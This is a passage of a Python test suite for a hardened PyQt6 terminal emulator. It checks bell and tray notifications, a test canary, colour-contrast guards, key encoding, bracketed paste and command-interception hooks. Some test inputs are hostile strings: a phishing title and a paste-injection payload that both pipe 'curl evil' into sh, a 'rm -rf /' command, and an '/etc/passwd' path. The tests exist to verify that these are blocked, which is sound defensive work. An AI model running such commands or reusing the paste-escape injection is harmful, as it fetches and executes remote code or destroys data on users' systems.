eq(_be.bell_channels(), {'visual'}, 'apply_bell accepts a set')
_be.apply_bell('bogus,off')
eq(_be.bell_channels(), set(), 'unknown/legacy-off tokens yield no channels')

_orig_qapp = _stmod.QApplication
_stmod.QApplication = _QAppShim
try:
    fake = _QAppShim._fake
    _be.apply_bell('audible')
    feed_output(_be, b'ding\x07more\x07')          # two BELs in one burst
    eq(fake.beeps, 1, 'a BEL burst rings once (rate-limited)')
    fake.beeps = 0
    feed_output(_be, b'\x1b]0;a title\x07')        # OSC terminator, not a bell
    eq(fake.beeps, 0, 'an OSC-terminating BEL does not ring')
    _be.apply_bell('off')
    feed_output(_be, b'x\x07y')
    eq(fake.beeps, 0, 'silent bell does not ring')
    _be.apply_bell('visual')
    _be._last_bell = 0.0                           # clear the rate-limit gate
    feed_output(_be, b'attn\x07')
    eq(fake.alerts, 1, 'visual channel raises a window urgency alert')
    # non-exclusive: audible + visual together fire BOTH on one bell
    fake.beeps = 0
    fake.alerts = 0
    _be.apply_bell('audible,visual')
    _be._last_bell = 0.0
    feed_output(_be, b'both\x07')
    eq((fake.beeps, fake.alerts), (1, 1), 'audible+visual both fire on one bell')
    # tray channel emits the bell_tray signal (the window shows the popup)
    _trays = []
    _be.bell_tray.connect(lambda label: _trays.append(label))
    _be.apply_bell('tray')
    _be._last_bell = 0.0
    feed_output(_be, b'ping\x07')
    eq(len(_trays), 1, 'tray channel emits a bell_tray notification')
    # a shell OSC title (BEL-terminated) split across two reads must NOT false-ring:
    # the BEL is the OSC terminator, consumed by the carry, not a standalone bell
    fake.beeps = 0
    _be.apply_bell('audible')
    _be._last_bell = 0.0
    feed_output(_be, b'\x1b]0;host: ~/dir')        # OSC title, no terminator yet
    feed_output(_be, b'\x07$ ')                    # its BEL terminator next read
    eq(fake.beeps, 0, 'a shell OSC title split across reads does not false-ring the bell')
finally:
    _stmod.QApplication = _orig_qapp
_be.close()

# bell sound file is accepted only inside an allowed folder (AppArmor-enforceable)
from secure_terminal.terminal import sound_file_allowed as _sfa, BELL_SOUND_DIRS as _bsd  # noqa: E402
ok(not _sfa('/etc/passwd'), 'a sound file outside the allowed folders is rejected')
ok(not _sfa(''), 'an empty sound path is rejected')
_sound_ok = None
for _d in _bsd:
    if os.path.isdir(_d):
        for _root, _dirs, _files in os.walk(_d):
            _snd = [f for f in _files if f.endswith(('.wav', '.ogg', '.oga'))]
            if _snd:
                _sound_ok = os.path.join(_root, _snd[0])
                break
    if _sound_ok:
        break
if _sound_ok:
    ok(_sfa(_sound_ok), 'a sound file inside an allowed folder is accepted (%s)' % _sound_ok)

# a malformed persisted bell spec (corrupt session) never raises -> no channels
eq(SecureTerminal._parse_bell(123), set(), 'a non-iterable bell spec yields no channels')
eq(SecureTerminal._parse_bell([None, 'audible', 5]), {'audible'},
   'a list with non-string elements is filtered, not fatal')
eq(SecureTerminal._parse_bell({'visual', 'nope'}), {'visual'},
   'an unknown channel in a set is dropped')

# toggling one channel preserves the current tab's OTHER channels (codex F2)
_bt = SecureTerminal(command='/bin/cat')
win.tabs.addTab(_bt, 'bell-preserve')
win.tabs.setCurrentWidget(_bt)
_bt.apply_bell({'visual'})
win._default_bell = set()                         # make the tab differ from default
win.set_bell_channel('tray', True)
eq(_bt.bell_channels(), {'visual', 'tray'},
   'toggling one channel keeps the current tab other channels')
eq(win._default_bell, {'tray'}, 'the global default tracks the toggled channel')
win.tabs.removeTab(win.tabs.indexOf(_bt))
_bt.close()

# a bell_sound admin lock refuses the sound setter
_saved_l2 = win._locked
win._locked = set(win._locked) | {'bell_sound'}
win._default_bell_sound = ''
win.set_bell_sound('/usr/share/sounds/anything.wav')
eq(win._default_bell_sound, '', 'a bell_sound lock refuses set_bell_sound')
win._locked = _saved_l2

# switching modes clears a pending CLI discard state, or output after the switch
# back would be swallowed until a stray terminator (codex F2)
if tui_available():
    _bd = SecureTerminal(command='/bin/cat')
    _bd._esc_drop = 'P'
    _bd.apply_tui(True)
    eq(_bd._esc_drop, '', 'switching to TUI clears a pending CLI discard state')
    _bd.close()

# an over-cap OSC (introducer truncated by the discard) still surfaces an OSC-use
# notice, so padding an OSC past the cap cannot evade the once-per-type banner (F5)
_bo = SecureTerminal(command='/bin/cat')
_osc_seen = []
_bo.osc_used.connect(lambda k: _osc_seen.append(k))
feed_output(_bo, b'\x1b]0;' + b'A' * 5000)         # >cap OSC, no terminator -> discard
ok('osc_other' in _osc_seen, 'an over-cap OSC still surfaces an OSC-use notice')
_bo.close()

# --- system tray: opt-in, default off, no untrusted output on the tray --------
# Offscreen has no real tray, so exercise the gating/persist logic and the
# deception-safe notification text directly (injecting a fake tray object).
eq(win._systray, False, 'systray is opt-in: default off')
eq(win.act_systray.isChecked(), False, 'systray menu action reflects the default (off)')
ok(not win._bell_actions['tray'].isEnabled(),
   "the 'Tray popup' bell channel is greyed out while the tray is off")

# Offscreen has NO system tray, so enabling must fail closed: revert to off and
# leave the 'tray' bell channel greyed, never present the feature as active.
win._tray = None
win.set_systray(True)
ok(not win._systray and not win.act_systray.isChecked(),
   'set_systray(True) reverts when no system tray is available')
ok(not win._bell_actions['tray'].isEnabled(),
   'the tray bell channel stays greyed when no tray is available')


class _FakeTray:                                       # captures showMessage bodies
    def __init__(self):
        self.bodies = []

    def showMessage(self, _title, body, *_a):
        self.bodies.append(body)

    def hide(self):
        pass

# With a tray available (faked), enabling really enables and un-greys the channel.
from PyQt6.QtWidgets import QSystemTrayIcon as _QSTI                # noqa: E402
_orig_avail = _QSTI.isSystemTrayAvailable
_QSTI.isSystemTrayAvailable = staticmethod(lambda: True)
try:
    win._tray = _FakeTray()          # so _tray_icon() returns it, no real construction
    win.set_systray(True)
    ok(win._systray and win.act_systray.isChecked(),
       'set_systray(True) enables the tray when one is available')
    ok(win._bell_actions['tray'].isEnabled(),
       "enabling the tray un-greys the 'Tray popup' bell channel")
    win.set_systray(False)
    ok(not win._systray and not win._bell_actions['tray'].isEnabled(),
       'set_systray(False) disables the tray and re-greys the bell channel')

    # admin lock: a locked systray key makes the toggle a no-op
    _saved_locked = win._locked
    win._locked = frozenset({'systray'})
    win.set_systray(True)
    ok(not win._systray, 'a systray admin lock makes set_systray a no-op')
    win._locked = _saved_locked
finally:
    _QSTI.isSystemTrayAvailable = _orig_avail

# _restore_window preserves maximized / full-screen, clearing only 'minimized' --
# restoring from the tray must not shrink a maximized window.
win.setWindowState(Qt.WindowState.WindowMaximized | Qt.WindowState.WindowMinimized)
win._restore_window()
_wstate = win.windowState()
ok(not (_wstate & Qt.WindowState.WindowMinimized),
   '_restore_window clears the minimized bit')
ok(bool(_wstate & Qt.WindowState.WindowMaximized),
   '_restore_window preserves the maximized state (no shrink on restore)')
win.setWindowState(Qt.WindowState.WindowNoState)

# The tray bell notification must carry NO program-set title -- that would put
# attacker-controlled text on an out-of-grid, trusted-looking surface (phishing).
win._systray = True
win._tray = _FakeTray()
_evil = 'Session expired -- run: curl evil | sh'
_tterm = win.tabs.widget(0)
win._user_titles.pop(_tterm, None)
win._on_bell_tray(_tterm, _evil)
ok(win._tray.bodies and _evil not in win._tray.bodies[-1],
   'tray bell body never contains the program-set title')
ok(win._tray.bodies and win._tray.bodies[-1].startswith('Bell in '),
   'tray bell body is a generic trusted locator when the tab is unnamed')
win._user_titles[_tterm] = 'my-build'
win._on_bell_tray(_tterm, _evil)
ok('my-build' in win._tray.bodies[-1] and _evil not in win._tray.bodies[-1],
   'tray bell uses the user-set tab name, never the program title')
win._user_titles.pop(_tterm, None)
win._systray = False
win._tray = None

# --- --test-canary: the EICAR-style positive control -------------------------
# secure-terminal is secure by construction, so an adversarial corpus test sees
# our canary NEVER fire -- indistinguishable from a broken harness that fires
# nothing. `--test-canary` makes us deliberately perform the safe canary action
# so the harness can prove it can SEE a fired canary before trusting any run. The
# marker goes to a single PREDEFINED, owner-only path (never a caller-supplied
# one) so the write can never be aimed elsewhere and AppArmor can confine it.
# Here we verify the control: token on stdout, marker in the predefined dir,
# fail-loud when that dir is unusable, benign token.
import subprocess as _sp                                        # noqa: E402
from secure_terminal.main import canary_marker_path as _canary_marker_path  # noqa: E402

# Fixed protocol constant; MUST match secure_terminal.main.CANARY_TOKEN. Asserted
# by value (not imported) so token drift breaks the corpus/terminal contract loud.
_CANARY_TOKEN = 'SECURE-TERMINAL-TEST-CANARY-POSITIVE-CONTROL-V1'


def _run_canary(env_extra=None, timeout=30, argv_tail=('--test-canary',)):
    code = ('import sys\n'
            'sys.argv = %r\n'
            'from secure_terminal.main import main\n'
            'sys.exit(main())\n' % (['secure-terminal', *argv_tail],))
    env = dict(os.environ, PYTHONPATH=os.pathsep.join(sys.path))
    if env_extra:
        env.update(env_extra)
    # This suite sets SIGCHLD=SIG_IGN so Qt terminal shells auto-reap; that also
    # makes the kernel reap THIS child before subprocess can collect its status,
    # zeroing the exit code. Restore default handling just for the wait so the
    # fail-loud exit code (the canary's whole point) is observed faithfully.
    _prev = signal.signal(signal.SIGCHLD, signal.SIG_DFL)
    try:
        proc = _sp.run([sys.executable, '-c', code], env=env,
                       stdin=_sp.DEVNULL, stdout=_sp.PIPE, stderr=_sp.PIPE,
                       timeout=timeout)
    finally:
        signal.signal(signal.SIGCHLD, _prev)
    return (proc.stdout.decode('utf-8', 'replace'),
            proc.stderr.decode('utf-8', 'replace'), proc.returncode)


def _marker_under(runtime_dir):
    """The predefined marker path for a given runtime dir, via the real resolver
    (no path duplicated in the test)."""
    _saved = os.environ.get('XDG_RUNTIME_DIR')
    os.environ['XDG_RUNTIME_DIR'] = runtime_dir
    try:
        return _canary_marker_path()
    finally:
        if _saved is None:
            os.environ.pop('XDG_RUNTIME_DIR', None)
        else:
            os.environ['XDG_RUNTIME_DIR'] = _saved

# Fires: token on stdout AND written to the predefined, owner-only marker.
_crt = tempfile.mkdtemp(prefix='st-canary-run-')
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt})
_marker = _marker_under(_crt)
_cwrote = ''
if os.path.exists(_marker):
    with open(_marker, encoding='ascii') as _cfh:
        _cwrote = _cfh.read()
ok(_CANARY_TOKEN in _cout and _crc == 0,
   '--test-canary: fires the token on stdout and exits 0')
ok(_CANARY_TOKEN in _cwrote,
   '--test-canary: writes the token to the predefined marker dir')
# The marker is confined to the predefined runtime subtree, not an arbitrary path.
ok(_marker.startswith(os.path.join(_crt, 'secure-terminal', 'canary') + os.sep),
   '--test-canary: marker lives under the predefined <runtime>/secure-terminal/canary/')

# An unusable predefined dir must FAIL LOUD (exit 1), never silently pretend
# success -- the whole point is that a harness can detect a machinery fault. Force
# it by planting a FILE where the "canary" directory must be created.
_crt2 = tempfile.mkdtemp(prefix='st-canary-blk-')
os.makedirs(os.path.join(_crt2, 'secure-terminal'), exist_ok=True)
with open(os.path.join(_crt2, 'secure-terminal', 'canary'), 'w') as _blk:
    _blk.write('')                       # a file, so makedirs(.../canary/) fails
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt2})
ok(_crc == 1,
   '--test-canary: exits 1 (fails loud) when the predefined marker dir is unusable')

# --test-canary is a GLOBAL option: it must fire even when another global (e.g.
# --new-instance from a wrapper) precedes it, not only as the first token.
_crt3 = tempfile.mkdtemp(prefix='st-canary-glob-')
_cout, _cerr, _crc = _run_canary({'XDG_RUNTIME_DIR': _crt3},
                                 argv_tail=('--new-instance', '--test-canary'))
ok(_CANARY_TOKEN in _cout and _crc == 0,
   '--test-canary: fires when it follows another global option (not first token)')

# The token must be a benign literal -- no ESC, no control chars, no shell
# metacharacters -- so the positive control can never itself harm a tester.
ok(all(32 <= ord(_ch) < 127 for _ch in _CANARY_TOKEN)
   and not (set(_CANARY_TOKEN) & set('\x1b;$`|&<>()')),
   '--test-canary: token is a benign printable-ASCII literal')

# --- bell sound gating + playback ---------------------------------------------
import secure_terminal.terminal as _term          # noqa: E402
import tempfile as _tempfile                       # noqa: E402

ok(not _term.sound_file_allowed(''),
   'sound_file_allowed: empty path is rejected')
ok(not _term.sound_file_allowed('/no/such/sound.wav'),
   'sound_file_allowed: a missing file is rejected')
_snd_tmp = _tempfile.mkdtemp()
_outside = os.path.join(_snd_tmp, 'outside.wav')
with open(_outside, 'wb') as _h:
    _h.write(b'RIFF')
ok(not _term.sound_file_allowed(_outside),
   'sound_file_allowed: a file outside the allowed dirs is rejected')
# with the allowed-dirs list pointed at our temp dir, a file inside is accepted
_orig_dirs = _term.BELL_SOUND_DIRS
_term.BELL_SOUND_DIRS = (_snd_tmp,)
try:
    ok(_term.sound_file_allowed(_outside),
       'sound_file_allowed: a real file inside an allowed dir is accepted')
    # _play_sound uses QtMultimedia (a hard dependency); mock QSoundEffect so the
    # real playback path (build the effect, set the source, play, return True) is
    # exercised without needing an audio device in the test environment.
    import types as _types
    _fake_qm = _types.ModuleType('PyQt6.QtMultimedia')

    class _FakeSoundEffect:
        raise_on = None

        def __init__(self, _parent=None):
            if _FakeSoundEffect.raise_on == 'init':
                raise RuntimeError('no audio device')

        def setSource(self, _url):
            pass

        def play(self):
            if _FakeSoundEffect.raise_on == 'play':
                raise RuntimeError('playback failed')

    _fake_qm.QSoundEffect = _FakeSoundEffect
    _o_qm = sys.modules.get('PyQt6.QtMultimedia')
    sys.modules['PyQt6.QtMultimedia'] = _fake_qm
    try:
        _bell = SecureTerminal(command='/bin/cat')
        _bell.apply_bell_sound(_outside)
        ok(_bell._bell_sound == _outside, 'apply_bell_sound: an allowed path is stored')
        ok(_bell._play_sound() is True,
           '_play_sound: builds the sound effect and plays it -> True')
        _bell._sound_effect = None
        _FakeSoundEffect.raise_on = 'play'
        ok(_bell._play_sound() is False,
           '_play_sound: a playback error is contained -> False')
    finally:
        if _o_qm is None:
            sys.modules.pop('PyQt6.QtMultimedia', None)
        else:
            sys.modules['PyQt6.QtMultimedia'] = _o_qm
    _bell2 = SecureTerminal(command='/bin/cat')
    ok(_bell2._play_sound() is False, '_play_sound: no configured sound -> False')
finally:
    _term.BELL_SOUND_DIRS = _orig_dirs

# --- hook transcript providers ------------------------------------------------
_htx = SecureTerminal(command='/bin/cat')
_htx._append('line one\nline two\nline three')
_htx._hook = {'transcript': 'full'}
ok('line one' in _htx._hook_transcript() and 'three' in _htx._hook_transcript(),
   '_hook_transcript full: returns the whole buffer')
_htx._hook = {'transcript': 'tail:2'}
_tail = _htx._hook_transcript()
ok('three' in _tail and 'one' not in _tail,
   '_hook_transcript tail:N: returns only the last N lines')
_htx._hook = {'transcript': 'tail:notanumber'}
eq(_htx._hook_transcript(), '',
   '_hook_transcript tail: a non-numeric count yields nothing')
_htx._hook = {'transcript': 'none'}
eq(_htx._hook_transcript(), '', '_hook_transcript none: returns nothing')

# --- TUI keystroke encoding (_tui_key) ----------------------------------------
_tk = SecureTerminal(command='/bin/cat')
_tksent = spy_writes(_tk)


def _tuikey(qtkey, text='', mods=Qt.KeyboardModifier.NoModifier):
    _tk._tui_key(QKeyEvent(QEvent.Type.KeyPress, qtkey, mods, text))


_tuikey(Qt.Key.Key_Tab, '\t', Qt.KeyboardModifier.ShiftModifier)   # back-tab
eq(_tksent, [b'\x1b[Z'], 'TUI: Shift+Tab -> back-tab (CSI Z)')
_tksent.clear()
_tuikey(Qt.Key.Key_Up)                                             # mapped arrow
eq(_tksent, [b'\x1b[A'], 'TUI: an arrow key sends its VT sequence')
_tksent.clear()
_tuikey(Qt.Key.Key_C, '', Qt.KeyboardModifier.ControlModifier)     # Ctrl+C
eq(_tksent, [b'\x03'], 'TUI: Ctrl+letter sends the control byte')
_tksent.clear()
_tuikey(Qt.Key.Key_BracketLeft, '\x1b', Qt.KeyboardModifier.ControlModifier)
eq(_tksent, [b'\x1b'], 'TUI: a control-char keystroke is forwarded as its byte')
_tksent.clear()
_tuikey(Qt.Key.Key_A, 'a')                                         # printable
eq(_tksent, [b'a'], 'TUI: a printable key is sent as UTF-8')
_tksent.clear()
_tuikey(Qt.Key.Key_A, 'a', Qt.KeyboardModifier.AltModifier)        # Alt+printable
eq(_tksent, [b'\x1ba'], 'TUI: Alt+printable is prefixed with ESC (meta)')
_tksent.clear()
_tuikey(Qt.Key.Key_unknown, chr(0x202E))                           # bidi override
eq(_tksent, [], 'TUI: a non-printable keystroke is dropped')

# --- foreground process group / cwd helpers -----------------------------------
_fg = SecureTerminal(command='/bin/cat')
_saved_fd = _fg._fd
_fg._fd = None
ok(_fg._foreground_pgrp() is None, '_foreground_pgrp: no pty fd -> None')
ok(_fg.cwd_basename() is None or isinstance(_fg.cwd_basename(), str),
   'cwd_basename: tolerates a missing foreground')
_fg._fd = _saved_fd
# a pipe fd is not a tty -> tcgetpgrp raises -> None
_pr, _pw = os.pipe()
_fg._fd = _pr
ok(_fg._foreground_pgrp() is None,
   '_foreground_pgrp: a non-tty fd -> None (tcgetpgrp fails)')
_fg._fd = _saved_fd
os.close(_pr)
os.close(_pw)
# has_foreground_program / terminate_foreground with nothing to act on
_fg._foreground_pgrp = lambda: None
ok(not _fg.has_foreground_program(),
   'has_foreground_program: no foreground group -> False')
ok(not _fg.terminate_foreground(),
   'terminate_foreground: nothing running -> no signal sent')

# --- the real _hook_ask prompt (QMessageBox driven headlessly) ----------------
from PyQt6.QtWidgets import QMessageBox as _QMB          # noqa: E402
_ha = SecureTerminal(command='/bin/cat')
# a block with no suggestion needs no prompt -> discard immediately
eq(_ha._hook_ask('rm -rf /', {'verdict': 'block', 'suggestion': '', 'message': ''}),
   'discard', '_hook_ask: a block with no suggestion discards without a prompt')
# drive the dialog by faking which button the user clicked, per role
_orig_mb_exec = _QMB.exec
_orig_mb_clicked = _QMB.clickedButton
_pick = {'role': None}


def _fake_mb_exec(self):
    return 0


def _fake_mb_clicked(self):
    for _b in self.buttons():
        if _pick['role'] is not None and self.buttonRole(_b) == _pick['role']:
            return _b
    return None


_QMB.exec = _fake_mb_exec
_QMB.clickedButton = _fake_mb_clicked
try:
    _res = {'verdict': 'ask', 'suggestion': 'ls -la', 'message': 'looks risky'}
    _pick['role'] = _QMB.ButtonRole.AcceptRole
    eq(_ha._hook_ask('ls', _res), 'run', '_hook_ask: "Run as typed" -> run')
    _pick['role'] = _QMB.ButtonRole.ActionRole
    eq(_ha._hook_ask('ls', _res), 'suggest', '_hook_ask: "Use suggestion" -> suggest')
    _pick['role'] = _QMB.ButtonRole.RejectRole
    eq(_ha._hook_ask('ls', _res), 'discard', '_hook_ask: Cancel -> discard')
finally:
    _QMB.exec = _orig_mb_exec
    _QMB.clickedButton = _orig_mb_clicked

# --- Ctrl+wheel zoom ----------------------------------------------------------
from PyQt6.QtGui import QWheelEvent          # noqa: E402
from PyQt6.QtCore import QPointF, QPoint      # noqa: E402
_wz = SecureTerminal(command='/bin/cat')
_zoom = []
_wz.zoom_step.connect(_zoom.append)


def _wheel(dy, mods):
    ev = QWheelEvent(QPointF(1, 1), QPointF(1, 1), QPoint(0, 0), QPoint(0, dy),
                     Qt.MouseButton.NoButton, mods,
                     Qt.ScrollPhase.NoScrollPhase, False)
    _wz.wheelEvent(ev)


_wheel(120, Qt.KeyboardModifier.ControlModifier)
_wheel(-120, Qt.KeyboardModifier.ControlModifier)
eq(_zoom, [1, -1], 'Ctrl+wheel emits a zoom step in the scroll direction')
_zoom.clear()
_wheel(120, Qt.KeyboardModifier.NoModifier)     # plain wheel -> normal scroll
eq(_zoom, [], 'a plain wheel does not zoom')

# --- pyte cell -> QTextCharFormat rendering (_pyte_format / _pyte_qcolor) ------
from PyQt6.QtGui import QFont          # noqa: E402


class _Cell:                                # a minimal duck-typed pyte cell
    def __init__(self, fg='default', bg='default', bold=False, reverse=False,
                 underscore=False):
        self.fg = fg
        self.bg = bg
        self.bold = bold
        self.reverse = reverse
        self.underscore = underscore


_rt = SecureTerminal(command='/bin/cat')
# a truecolor 6-hex fg + bg -> both applied (valid QColor path)
_f1 = _rt._pyte_format(_Cell(fg='ff0000', bg='00ff00'))
ok(_f1.foreground().color().name() == '#ff0000',
   '_pyte_format: a truecolor fg hex is applied')
ok(_f1.background().color().name() == '#00ff00',
   '_pyte_format: a background colour is applied')
# an invalid hex colour falls back to the default foreground
ok(_rt._pyte_qcolor('nothex', None) is None,
   '_pyte_qcolor: an invalid hex with no default -> None')
ok(_rt._pyte_qcolor('zzzzzz', QColor('#123456').name()).isValid(),
   '_pyte_qcolor: an invalid hex falls back to the given default')
# reverse video swaps fg/bg
_f2 = _rt._pyte_format(_Cell(fg='ff0000', bg='0000ff', reverse=True))
ok(_f2.background().color().name() == '#ff0000',
   '_pyte_format: reverse video swaps fg into the background')
# bold + underscore attributes carry through
_f3 = _rt._pyte_format(_Cell(fg='cccccc', bold=True, underscore=True))
ok(_f3.fontWeight() == QFont.Weight.Bold and _f3.fontUnderline(),
   '_pyte_format: bold and underscore attributes are applied')
# fg == bg (a program hiding text) triggers the contrast guard -> readable fg
_f4 = _rt._pyte_format(_Cell(fg='202020', bg='202020'))
ok(_f4.foreground().color().name() != '#202020',
   '_pyte_format: fg == bg is overridden to a readable colour')

# --- exhaustive TUI contrast sweep: every pyte colour, both reverse states -----
# The TUI path (_pyte_format) has an extra lever the line path lacks -- reverse
# video, which swaps fg/bg -- so sweep it too: every pyte colour name (plus
# 'default') as fg against each as bg, bold on/off, reverse on/off, both themes.
# Bold promotes fg to its bright palette variant here, so bright colours are
# covered as well. Invariant: the drawn fg is never near-invisible on its bg.
from secure_terminal.terminal import _PYTE_COLOR as _PC, THEMES as _TH2  # noqa: E402
from secure_terminal.terminal import _rgb as _rgb3                      # noqa: E402
from secure_terminal.sanitize import too_close as _tc3                  # noqa: E402
_names = list(_PC.keys()) + ['default']

def _tui_pair(_fmt, _theme):
    _fgb = _fmt.foreground()
    if _fgb.style() == Qt.BrushStyle.NoBrush:
        return None
    _theme_bg = _TH2.get(_theme, _TH2['dark'])[0]
    _bgb = _fmt.background()
    _bg = _bgb.color() if _bgb.style() != Qt.BrushStyle.NoBrush else QColor(_theme_bg)
    return _rgb3(_fgb.color()), _rgb3(_bg)

_tui_checked = 0
_tui_bad = []
for _theme in ('dark', 'light'):
    _rt.apply_theme(_theme)
    _rt._fmt_cache.clear()                  # theme change invalidates cached formats
    for _fg in _names:
        for _bg in _names:
            for _bold in (False, True):
                for _rev in (False, True):
                    _pair = _tui_pair(_rt._pyte_format(
                        _Cell(fg=_fg, bg=_bg, bold=_bold, reverse=_rev)), _theme)
                    if _pair is None:
                        continue
                    _tui_checked += 1
                    if _tc3(*_pair):
                        _tui_bad.append((_theme, _fg, _bg, _bold, _rev))
ok(not _tui_bad,
   'contrast(tui): every pyte fg x bg x bold x reverse x theme stays readable '
   '(%d combos checked, unreadable: %r)' % (_tui_checked, _tui_bad[:3]))
_rt.apply_theme('dark')
_rt._fmt_cache.clear()

# the OSC 10/11 default-move attack: a program moves the DEFAULT fg and bg onto
# the same colour, then prints text in the default colours -- hoping the guard's
# fallback (which uses the default fg) collides too. The guard must fall back to a
# fixed readable colour, not the program-moved default, so the text still shows.
_rt._osc_palette['fg'] = '#303030'
_rt._osc_palette['bg'] = '#303030'
_f_osc = _rt._pyte_format(_Cell(fg='default', bg='default'))
_op = _tui_pair(_f_osc, 'dark')
ok(_op is not None and not _tc3(*_op),
   'contrast(tui): the OSC default-move attack (fg==bg via OSC 10/11) is still forced readable')
_rt._osc_palette.pop('fg', None)
_rt._osc_palette.pop('bg', None)
_rt._fmt_cache.clear()

# _pyte_bell rings unless we are seeding retained scrollback
_rt._seeding = True
_rt._pyte_bell()                            # seeding -> no ring (just returns)
_rt._seeding = False
_rt._pyte_bell()                            # -> _ring() (must not raise)
ok(True, '_pyte_bell: rings when not seeding, stays quiet while seeding')

# --- terminate_foreground actually signals a real foreground group ------------
import subprocess as _subprocess          # noqa: E402
import secure_terminal.terminal as _term2  # noqa: E402  (QTimer lives here)

# a throwaway process group that IGNORES SIGTERM, so the 2s survivor SIGKILLs it
_victim = _subprocess.Popen(['sh', '-c', 'trap "" TERM; exec sleep 30'],
                            start_new_session=True)
pump(60)
_victim_pgrp = os.getpgid(_victim.pid)
_fgk = SecureTerminal(command='/bin/cat')
_fgk._pid = None                            # so the group is never mistaken for the shell
_fgk._foreground_pgrp = lambda: _victim_pgrp
ok(_fgk.has_foreground_program(),
   'has_foreground_program: a real foreground group -> True')
ok(_fgk.terminate_foreground(),
   'terminate_foreground: SIGTERMs the foreground group')
pump(2300)                                  # let the survivor SIGKILL fire
try:
    _victim.wait(timeout=3)
except _subprocess.TimeoutExpired:
    _victim.kill()
ok(_victim.returncode is not None,
   'terminate_foreground: a TERM-ignoring group is SIGKILLed by the survivor')

# --- bell ring: channel gating + rate limit -----------------------------------
_rg = SecureTerminal(command='/bin/cat')
_rg._bell_channels = set()
_rg._ring()                                 # no channels enabled -> returns early
ok(True, '_ring: with no channels enabled it does nothing')
_rg._bell_channels = {'audible'}
_rg._last_bell = 0.0
_rg._ring()                                 # fires
_rg._ring()                                 # within 200ms -> rate-limited (returns)
ok(True, '_ring: a second ring within ~200ms is rate-limited')
eq(_rg.current_paste_delay(), _rg._paste_delay,
   'current_paste_delay: returns the configured paste delay')

# --- hook intercept: the run / suggest / empty-line branches ------------------
hk2 = SecureTerminal(command='/bin/cat')
hk2.apply_hook({'argv': _handler, 'timeout': 10, 'on_error': 'allow',
                'transcript': 'none'})
_h2 = spy_writes(hk2)
# an empty line is not intercepted -> normal submit
hk2._line_buffer = ''
hk2._line_dirty = False
key(hk2, Qt.Key.Key_Return)
ok(b'\r' in _h2, 'hook: an empty line submits without interception')
# a recalled/edited line with the user choosing Run -> submitted
_h2.clear()
hk2._hook_ask = lambda _c, _r: 'run'
key(hk2, Qt.Key.Key_Up)                     # marks the line dirty
key(hk2, Qt.Key.Key_Return)
ok(b'\r' in _h2, 'hook: an edited line the user runs is submitted')
# a blocked command the user chooses to Run -> submitted
_h2.clear()
hk2._hook_ask = lambda _c, _r: 'run'
_htype(hk2, 'x sudo sh')
key(hk2, Qt.Key.Key_Return)
ok(b'\r' in _h2, 'hook: a flagged command the user runs is submitted')
# a blocked command the user replaces with the suggestion -> suggestion inserted
_h2.clear()
hk2._hook_ask = lambda _c, _r: 'suggest'
_htype(hk2, 'x sudo sh')
key(hk2, Qt.Key.Key_Return)
ok(b'ls' in b''.join(_h2) and b'\x15' in _h2,
   'hook: choosing the suggestion discards the line and inserts it')

# --- paste: an all-control paste sanitizes to nothing; bracketed paste in TUI --
_pt = SecureTerminal(command='/bin/cat')
_pt.apply_paste_warn('never')               # test the sanitize+bracket path directly
_pts = spy_writes(_pt)
_pmime = QMimeData()
_pmime.setText('\x00\x01\x02')              # only control bytes -> stripped to ''
_pt.insertFromMimeData(_pmime)
eq(_pts, [], 'paste: a control-only clipboard sanitizes to nothing (sends nothing)')
# bracketed paste: with DEC mode 2004 set by the program, a paste is wrapped
_pt.apply_tui(True)
feed_output(_pt, b'\x1b[?2004h')            # program enables bracketed paste
_pts.clear()
_pmime2 = QMimeData()
_pmime2.setText('echo hi')
_pt.insertFromMimeData(_pmime2)
ok(_pts and _pts[0].startswith(b'\x1b[200~') and _pts[0].endswith(b'\x1b[201~'),
   'paste: bracketed-paste mode wraps the pasted data in the DEC 2004 markers')
# gap (ai-review): a paste containing the bracketed-paste END marker must NOT break
# out of the bracketed region and inject a command -- the ESC of an embedded
# \x1b[201~ is stripped, so the only real END marker is the terminal's own trailing
# one. Without this a pasted "...\x1b[201~; evil" would run "evil" as typed input.
_pts.clear()
_o_pw_bp = _pt.current_paste_warn()
_pt.apply_paste_warn('never')                       # send directly (test wrap+sanitize)
_pmime_bp = QMimeData()
_pmime_bp.setText('ls\x1b[201~; curl evil|sh')
_pt.insertFromMimeData(_pmime_bp)
ok(_pts and _pts[0].count(b'\x1b[201~') == 1 and _pts[0].endswith(b'\x1b[201~')
   and b'\x1b[200~' not in _pts[0][6:],
   'paste: an embedded bracketed-paste END marker cannot break out (ESC stripped)')
_pt.apply_paste_warn(_o_pw_bp)

# --- reset_caret with no output cursor snaps to the document end --------------
_rc = SecureTerminal(command='/bin/cat')
_rc._out_cursor = None
_rc.reset_caret()
ok(True, 'reset_caret: with no output cursor it snaps the caret to the end')

# --- defensive syscall guards, fault-injected ---------------------------------
import os as _os

# shutdown tolerates an already-closed fd and a dead pid (close/kill/waitpid)
_sd = SecureTerminal(command='/bin/cat')
_rp, _wp = os.pipe()
os.close(_rp)
os.close(_wp)
_sd._fd = _rp                               # already closed -> os.close raises
_sd._pid = 999999                           # no such pid -> kill/waitpid raise
_sd.shutdown()
ok(_sd._fd is None and _sd._pid is None,
   'shutdown: tolerates a closed fd and a dead pid')

# _write is a safe no-op with no fd, and drops output on a closed fd
_wt2 = SecureTerminal(command='/bin/cat')
_wt2._fd = None
_wt2._write(b'x')                           # no fd -> return
_rp2, _wp2 = os.pipe()
os.close(_rp2)
os.close(_wp2)
_wt2._fd = _wp2                             # closed fd -> os.write OSError -> dropped
_wt2._write(b'x')
ok(True, '_write: safe no-op with no fd, and drops output on a closed fd')

# cwd / foreground helpers survive an OS error reading /proc
_cw = SecureTerminal(command='/bin/cat')
_o_readlink = _os.readlink
_o_getpgid = _os.getpgid
# Force a deterministic, truthy foreground pgrp so the readlink/getpgid fault-
# injections below are ALWAYS reached: a freshly-spawned cat's tcgetpgrp can briefly
# be unset (the setsid race), which would skip these defensive except branches. The
# cat's real _pid is left intact (non-None) so has_foreground_program reaches getpgid.
_cw._foreground_pgrp = lambda: os.getpid()


def _raise_os(*_a, **_k):
    raise OSError('injected')


try:
    _os.readlink = _raise_os
    eq(_cw._foreground_cwd(), '', '_foreground_cwd: a /proc read error -> empty')
    ok(_cw.cwd_basename() is None, 'cwd_basename: a /proc read error -> None')
    _os.getpgid = lambda *_a, **_k: (_ for _ in ()).throw(ProcessLookupError())
